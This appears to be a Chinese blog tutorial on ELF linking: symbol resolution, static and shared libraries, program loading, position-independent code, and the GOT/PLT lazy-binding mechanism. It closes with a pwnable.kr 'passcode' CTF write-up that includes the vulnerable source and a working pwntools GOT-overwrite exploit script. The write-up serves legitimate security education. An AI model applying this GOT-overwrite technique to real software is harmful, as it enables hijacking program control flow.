+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) Global <span class="title function_">symbols</span><span class="params">(模块内部定义的全局符号)</span></span><br><span class="line">	由模块m定义并能被其他模块引用的符号。例如，非<span class="type">static</span> C函数和非<span class="type">static</span>的C全局变量<span class="params">(指不带<span class="type">static</span>的全局变量)</span>如，main.c 中的全局变量名<span class="title function_">buf</span></span><br><span class="line"><span class="params">(<span class="number">2</span>)</span>External <span class="title function_">symbols</span><span class="params">(外部定义的全局符号)</span></span><br><span class="line">    由其他模块定义并被模块m引用的全局符号.如，main.c 中的函数名<span class="title function_">swap</span></span><br><span class="line"><span class="params">(<span class="number">3</span>)</span>Local <span class="title function_">symbols</span> <span class="params">(本模块的局部符号)</span></span><br><span class="line">    仅由模块m定义和引用的本地符号。例如，在模块m中定义的带<span class="type">static</span>的C函数和全局变量.如，swap.c 中的<span class="type">static</span>变量名bufp1</span><br><span class="line">注:局部符号不是指程序中的局部变量<span class="params">(分配在栈中的临时性变量)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>目标文件中的符号表</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.symtab 节记录符号表信息，是一个结构数组，函数名在text节中，变量名在data节或bss节中</span><br></pre></td></tr></table></figure>
+
+<h2 id="静态链接和符号解析"><a href="#静态链接和符号解析" class="headerlink" title="静态链接和符号解析"></a>静态链接和符号解析</h2><p><strong>静态链接对象</strong><br>多个可重定位目标模块 + 静态库（标准库、自定义库）<br>（<code>.o</code>文件） （<code>.a</code>文件，其中包含多个<code>.o</code>模块）<br><strong>静态库 (.a archive files)</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 将所有相关的目标模块(.o)打包为一个单独的库文件(.a)，称为静态库文件 ，也称存档文件 (archive)</span><br><span class="line"><span class="number">2</span>) 使用静态库，可增强链接器功能，使其能通过查找一个或多个库文件中定义的符号来解析符号</span><br><span class="line"><span class="number">3</span>) 在构建可执行文件时，只需指定库文件名，链接器会自动到库中寻找那些应用程序用到的目标模块，并且只把用到的模块从库中拷贝出来</span><br><span class="line"><span class="number">4</span>) 在gcc命令行中无需明显指定C标准库libc.a(默认库)</span><br></pre></td></tr></table></figure>
+
+<p><strong>自定义一个静态库文件</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//program1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the first test program!n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//program2.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the second test program!n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function</span><span class="params">( )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc -m32 –c program1.c program2.c</span><br><span class="line">$ ar rcs -m32 mylib.a program1.o program2.o    <span class="comment">//将program1.o和program2.o打包生成mylib.a</span></span><br><span class="line">$ gcc -m32 –c main.c</span><br><span class="line">$ gcc -m32 –<span class="type">static</span> –o program main.o ./mylib.a</span><br><span class="line">$ ./program </span><br><span class="line">This is the first test program!</span><br></pre></td></tr></table></figure>
+
+<p><strong>链接器中符号解析的全过程</strong><br>三个重要集合：<br><code>E</code> 将要被合并以组成可执行文件的所有目标文件集合<br><code>U</code> 当前所有未解析的引用符号的集合<br><code>D</code> 当前所有定义符号的集合</p>
+<p>开始E、U、D为空，首先扫描<code>main.o</code>，把它加入E，同时把<code>Function</code>加入U，<code>main</code>加入D。接着扫描到<code>mylib.a</code>，将U中所有符号(本例中为<code>Function</code>)与<code>mylib.a</code>中所有目标模块(<code>program1.o</code>和<code>program2.o</code>)依次匹配，发现在<code>program1.o</code>中定义了<code>Function</code>，故<code>program1.o</code>加入E，<code>Function</code>从U转移到D。在<code>program1.o</code>中发现还有未解析符号<code>printf</code>，将其加到U。不断在<code>mylib.a</code>的各模块上进行迭代以匹配U中的符号，直到U、D都不再变化。此时U中只有一个未解析符号<code>printf</code>，而D中有<code>main</code>和<code>Function</code>。因为模块<code>program2.o</code>没有被加入E中，因而它被丢弃。接着，扫描默认的库文件<code>libc.a</code>，发现其目标模块<code>printf.o</code>定义了<code>printf</code>，于是<code>printf</code>也从U移到D，并将<code>printf.o</code>加入E，同时把它定义的所有符号加入D，而所有未解析符号加入U。处理完<code>libc.a</code>时，U一定是空的。</p>
+<p>注:被链接模块应按调用顺序指定！<br>若命令为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32–<span class="type">static</span> –o myproc ./mylib.a main.o</span><br></pre></td></tr></table></figure>
+
+<p>首先，扫描<code>mylib</code>，因是静态库，应根据其中是否存在U中未解析符号对应的定义符号来确定哪个<code>.o</code>被加入E。因为开始U为空，故其中两个<code>.o</code>模块都不被加入E中而被丢弃。然后，扫描<code>main.o</code>，将Function加入U，直到最后它都不能被解析,因此，出现链接错误，因为它只能用<code>mylib.a</code>中符号来解析，而<code>mylib</code>中两个<code>.o</code>模块都已被丢弃！</p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%9D%99%E6%80%81%E5%BA%93%E6%96%87%E4%BB%B6.PNG" alt="6"></p>
+<h2 id="可执行文件的加载"><a href="#可执行文件的加载" class="headerlink" title="可执行文件的加载"></a>可执行文件的加载</h2><p>通过调用<code>execve</code>系统调用函数来调用加载器：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 加载器（loader）根据可执行文件的程序（段）头表中的信息，将可执行文件的代码和数据从磁盘“拷贝”到存储器中</span><br><span class="line"><span class="number">2</span>) 加载后，将PC（EIP）设定指向Entry point ，最终执行main函数，以启动程序执行</span><br><span class="line"><span class="number">3</span>) execve()函数的功能是在当前进程上下文中加载并运行一个新程序</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/7%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.PNG" alt="7"></p>
+<p><code>execve()</code>函数的用法如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">char</span> *filename, <span class="type">char</span> *argv[], *envp[])</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>filename</code>是加载并运行的可执行文件名(如<code>./hello</code>)，可带参数列表<code>argv</code>和环境变量列表<code>envp</code>。若错误（如找不到指定文件<code>filename</code>），则返回<code>-1</code>，并将控制权交给调用程序； 若函数执行成功，则不返回，最终将控制权传递到可执行目标中的主函数<code>main</code>。</p>
+<p>主函数<code>main()</code>的原型形式如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span>; <span class="comment">//或者</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>argc</code>指定参数个数，参数列表中第一个总是命令名（可执行文件名）</p>
+<p><strong>hello程序的加载和运行过程</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Step1：在shell命令行提示符后输入命令：$./hello;</span><br><span class="line">Step2：shell命令行解释器构造argv和envp;</span><br><span class="line">Step3：调用fork()函数，创建一个子进程，与父进程shell完全相同(只读/共享)，包括只读代码段、可读写数据段、堆以及用户栈等;</span><br><span class="line">Step4：调用execve()函数,在当前进程(新创建的子进程)的上下文中加载并运行hello程序。将hello中的.text节、.data节、.bss节等内容加载到当前进程的虚拟地址空间(仅修改当前进程上下文中关于存储映像的一些数据结构，不从磁盘拷贝代码、数据等内容);</span><br><span class="line">Step5：调用hello程序的main()函数，hello程序开始在一个进程的上下文中运行</span><br></pre></td></tr></table></figure>
+
+<h2 id="共享库和动态链接【划重点】"><a href="#共享库和动态链接【划重点】" class="headerlink" title="共享库和动态链接【划重点】"></a>共享库和动态链接【划重点】</h2><p><strong>静态库有一些缺点</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 库函数（如<span class="built_in">printf</span>）被包含在每个运行进程的代码段中，对于并发运行上百个进程的系统，造成极大的主存资源浪费</span><br><span class="line"><span class="number">2</span>) 库函数（如<span class="built_in">printf</span>）被合并在可执行目标中，磁盘上存放着数千个可执行文件，造成磁盘空间的极大浪费</span><br><span class="line"><span class="number">3</span>) 程序员需关注是否有函数库的新版本出现，并须定期下载、重新编译和链接，更新困难、使用不便</span><br></pre></td></tr></table></figure>
+
+<p><strong>解决方案: Shared Libraries （共享库）</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 是一个目标文件，包含有代码和数据</span><br><span class="line"><span class="number">2</span>) 从程序中分离出来，磁盘和内存中都只有一个备份</span><br><span class="line"><span class="number">3</span>) 可以动态地在装入时或运行时被加载并链接</span><br><span class="line"><span class="number">4</span>) Window称其为动态链接库（Dynamic Link Libraries，.dll文件）</span><br><span class="line"><span class="number">5</span>) Linux称其为动态共享对象（ Dynamic Shared Objects, .so文件）</span><br></pre></td></tr></table></figure>
+
+<p><strong>自定义一个动态共享库文件</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//program3.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the third test program!n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//program4.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function4</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the fourth test program!n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Function3</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    Function3();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ gcc -m32–c program3.c program4.c</span><br><span class="line">$ gcc -m32 -shared -fPIC -o mylib.so program3.o program4.o</span><br><span class="line">$ gcc -m32 -c main.c</span><br><span class="line">$ gcc -m32 -o program main.o ./mylib.so</span><br><span class="line">$ ./program </span><br><span class="line">This is the third test program!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/8.PNG" alt="8"></p>
+<p><strong>地址无关代码【划重点】</strong><br>• 动态链接用到一个重要概念：<br>我们希望程序模块中共享的指令部分在装载时不需要因为装载地址的改变而改变，所以实现的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就叫做**地址无关代码（<code>Position-Independent Code</code>，<code>PIC</code>)**。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GCC选项-fPIC指示生成PIC代码</span><br></pre></td></tr></table></figure>
+
+<p>• 共享库代码是一种<code>PIC</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">共享库代码的位置可以是不确定的</span><br><span class="line">即使共享库代码的长度发生变化，也不影响调用它的程序</span><br></pre></td></tr></table></figure>
+
+<p>• 所有引用情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 模块内的数据访问。如模块内的全局变量和静态变量</span><br><span class="line">(<span class="number">2</span>) 模块内的过程调用、跳转。采用PC相对偏移寻址</span><br><span class="line">(<span class="number">3</span>) 模块间的数据访问。如外部变量的访问</span><br><span class="line">(<span class="number">4</span>) 模块间的过程调用、跳转</span><br></pre></td></tr></table></figure>
+
+<p>要实现动态链接，必须生成<code>PIC</code>代码，要生成<code>PIC</code>代码，主要解决第3和第4这两个问题</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">源代码:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    a=<span class="number">1</span>;</span><br><span class="line">    b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（1）模块内的函数调用或跳转</strong></p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/9%E6%A8%A1%E5%9D%97%E5%86%85%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%88%96%E8%B7%B3%E8%BD%AC.PNG" alt="9"></p>
+<p>调用或跳转源与目的地都在同一个模块，相对位置固定，只要用相对偏移寻址即可。<br><code>call</code>的目标地址为：<code>0x8048369</code> + <code>0xffffffdb(-0x25)</code> &#x3D; <code>0x8048344</code><br>注：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8048364</span>: e8 db ff ff ff call <span class="number">8048344</span> &lt;bar&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该指令是一条近址相对位移调用指令<br><strong>（2）模块内的数据引用</strong></p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/10%E6%A8%A1%E5%9D%97%E5%86%85%E6%95%B0%E6%8D%AE%E5%BC%95%E7%94%A8.PNG" alt="10"></p>
+<p>注：任何一条指令与它需要访问的模块内部数据之间的相对位置是固定的，那么只要相对于当前指令加上固定的偏移量就可以访问模块内部的数据了。</p>
+<p>变量<code>a</code>与引用<code>a</code>的指令之间的距离为常数，调用<code>__get_pc</code>后，<code>call</code>指令的返回地址被置<code>ECX</code>。若模块被加载到<code>0x9000000</code>，则<code>a</code>的访问地址为：<br><code>0x9000000</code>+<code>0x34c</code>+<code>0x118c</code>(<strong>指令与.data间距离</strong>)+<code>0x28</code>(<strong>a在.data节中偏移</strong>)</p>
+<p><strong>（3）模块间的数据访问</strong><br><code>ELF</code>解决模块间的数据访问目标地址的做法是<strong>在数据段里面建立一个指向这些变量的指针数组，也称为全局偏移表（Global Offset Table,Got）</strong>,当代码需要引用该全局变量时，可通过<code>GOT</code>中相对应的项间接引用。<br>模块在编译时可以确定<code>GOT</code>相对于当前指令的偏移，然后根据变量地址在<code>GOT</code>中的偏移就可得到变量的地址。比如，当指令要访问变量<code>b</code>时，程序会先找到<code>GOT</code>，然后根据<code>GOT</code>中变量所对应的项找到变量的目标地址。</p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/11%E6%A8%A1%E5%9D%97%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BC%95%E7%94%A8.PNG" alt="11"></p>
+<p><strong>（4）模块间的调用、跳转</strong><br>同理，我们可以使用类似于模块间的数据访问的方式，在<code>GOT</code>中加一个项(指针)，用于指向目标函数的首地址（如<code>&amp;ext</code>），但是也要多用三条指令并额外多用一个寄存器（如<code>EBX</code>）。因此，可用“<strong>延迟绑定（lazy binding）</strong>”技术来优化动态链接性能：<strong>当函数第一次被用到时才进行绑定（符号查找、重定位等）</strong>，这样可以大大加快程序启动速度。<br><code>ELF</code>使用<code>PLT</code>（Procedure linkage Table, 过程链接表)的方法来实现。通常我们调用某个外部模块的函数时，应该是通过<code>GOT</code>中相应的项进行间接跳转。而<code>PLT</code>为了实现延迟绑定，在这个过程中有增加了一层间接跳转。调用函数并不直接通过<code>GOT</code>跳转，而是通过一个叫作<code>PLT</code>项的结构来进行跳转。每个外部函数在<code>PLT</code>中都有一个相应的项，比如<code>bar()</code>在<code>PLT</code>中的项的地址我们称为<code>bar@plt</code>。其中<code>bar@plt</code>的实现如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure>
+
+<p>第一条指令是通过一条<code>GOT</code>间接跳转的指令。<code>bar@GOT</code>表示<code>GOT</code>中保存的bar()这个函数相应的项。链接器在初始化阶段没有将<code>bar()</code>的地址填入到该项中，而是将上面代码中第二条指令“<code>push n</code>”的地址填入到<code>bar@GOT</code>中。显然，第一条指令的效果是跳转到第二条指令，第二条指令将一个数字<code>n</code>压入堆栈中，该数字为bar这个符号引用在重定位表“<code>.rel.plt</code>”中的下标。接着将模块的<code>ID</code>压入堆栈中，然后调用<code>_dl_runtime_resolve</code>函数来完成符号解析和重定位工作。_<code>dl_runtime_resolve</code>在进行一系列工作以后将<code>bar()</code>的真正地址填入到<code>bar@GOT</code>中。再次调用<code>bar@plt</code>时，第一条<code>jump</code>指令能跳转到真正的<code>bar()</code>函数中，<code>bar()</code>函数返回的时候会根据堆栈里保存的<code>EIP</code>直接返回到调用者，而不会在继续执行<code>bar@plt</code>中第二条指令开始的那段代码。<br><code>ELF</code>将<code>GOT</code>拆分为两个表叫做“<code>.got</code>”和“<code>.got.plt</code>”:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) .got 用来保存全局变量引用的地址；</span><br><span class="line"><span class="number">2</span>) .got.plt 用来保存函数引用的地址，即对于外部函数的引用全部被分离出来放到了“.got.plt”中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/12%E6%A8%A1%E5%9D%97%E9%97%B4%E8%B7%B3%E8%BD%AC.PNG" alt="12"></p>
+<p>注：<code>Linux</code>下，<code>ELF</code>可执行文件虚拟地址空间默认从地址<code>0x08048000</code>开始分配</p>
+<h2 id="实践部分"><a href="#实践部分" class="headerlink" title="实践部分"></a>实践部分</h2><p>理解了何为<code>GOT</code>表和<code>PLT</code>之后，我们再通过<code>pwnable.kr</code>中的题目<code>passcode</code>来介绍一下<code>GOT</code>表覆盖技术：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br><span class="line"></span><br><span class="line"><span class="comment">//源代码passcode.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> passcode1;</span><br><span class="line">    <span class="type">int</span> passcode2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;checking...n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.n&quot;</span>);</span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题思路:</strong><br>由于<code>welcome()</code>和<code>login()</code>函数调用栈的<code>EBP</code>相同，通过<code>gdb</code>调试后可以发现</p>
+<p><img src="https://f1yingf0x-1300215590.cos.ap-chengdu.myqcloud.com/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Got%E8%A1%A8%E8%A6%86%E5%86%99%E6%8A%80%E6%9C%AF/13%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C.PNG" alt="13"></p>
+<p>输入的变量没有用取地址符号<code>&amp;</code>，导致读入数据的时候，<code>scanf</code>会把这个变量中的值当成存储地址来存放数据，<code>name</code>值的最后4个字节是<code>passcode1</code>值，所以可以通过将<code>passcode1</code>的值改为<code>fflush()</code>的地址，<code>scanf()</code>之后会调用<code>fflush()</code>函数，覆盖<code>fflush()</code>在<code>GOT</code>表中的内容，把<code>system(“/bin/cat flag”)</code>对应汇编代码地址写入<code>fflush()</code>中，当这个函数被调用时，就会直接执行<code>system(“/bin/cat flag”)</code>。</p>
+<p>通过<code>objdump -R passcode</code>命令查看<code>GOT</code>表可以发现<code>fflush()</code>位于<code>0x0804a004</code>处，即将<code>0x80485e3</code>（调用<code>system</code>的地址）覆写位于<code>0x0804a004</code>的<code>fflush()</code>函数的<code>GOT</code>表。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp.py</span></span><br><span class="line">#!/usr/bin/python </span><br><span class="line">from pwn import *</span><br><span class="line">p= process(<span class="string">&#x27;./passcode&#x27;</span>)</span><br><span class="line">fflush_got = <span class="number">0x0804a004</span></span><br><span class="line">system_addr = <span class="number">0x80485e3</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">96</span> + p32(fflush_got) + str(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
